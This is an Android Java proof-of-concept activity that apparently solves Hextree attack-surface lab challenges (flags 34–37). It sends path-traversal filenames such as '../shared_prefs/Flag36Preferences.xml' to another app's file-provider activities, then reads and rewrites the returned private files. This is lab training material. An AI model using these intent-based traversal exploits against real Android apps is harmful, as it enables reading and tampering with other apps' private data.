package com.bedo.poc_app;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.graphics.shapes.Utils;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;

public class File_Provider_Labs extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_file_provider_labs);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


    }

    public void Flag34(View view) {
        Intent intent = new Intent()
                .setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag34Activity"
                    )
                .putExtra("filename","flags/flag34.txt");

        startActivityForResult(intent,1001);
    }



    public void Flag35(View view) {
        Intent intent = new Intent()
                .setClassName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag35Activity"
                )
                .putExtra("filename","../flag35.txt");

        startActivityForResult(intent,1001);

    }


    public void Flag36(View view) {
        Intent intent = new Intent()
                .setClassName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag35Activity"
                )
                .putExtra("filename","../shared_prefs/Flag36Preferences.xml");

        startActivityForResult(intent,36);
    }

    public void Flag37(View view) {
        Intent intent = new Intent()
                .setClassName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag37Activity"
                )
                .setData(Uri.parse("content://com.bedo.poc_app.malicious"));
        startActivity(intent);
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if(data != null){
            Uri uriFlag = data.getData();
            Log.d("UriFile: ", String.valueOf(uriFlag));

            try {
                //1. Read
                InputStream inputStream = getContentResolver().openInputStream(uriFlag);
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = reader.readLine()) !=null ){
                    Log.i("Content Of File: ",line );
                    stringBuilder.append(line).append("\n");
                }
                inputStream.close();

                // For Flag36
                if(requestCode == 36){
                    String originalContent = stringBuilder.toString();
                    // Edit
                    String modifiedContent = originalContent.replace("false","true");
                    Log.d("ModifiedContent", "New Content: " + modifiedContent);
                    //Write
                    OutputStream outputStream = getContentResolver().openOutputStream(uriFlag, "w");

                    if (outputStream != null){

                        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream));
                        writer.write(modifiedContent);
                        writer.flush();
                        writer.close();
                        outputStream.close();
                        Log.i("Exploit_Status", "Done! Value changed to true.");

                    }
                    // Call Flag Activity
                    Intent intent = new Intent()
                            .setClassName(
                                    "io.hextree.attacksurface",
                                    "io.hextree.attacksurface.activities.Flag36Activity"
                            );
                    startActivity(intent);

                }
            } catch (IOException e){
            }

        }

    }


}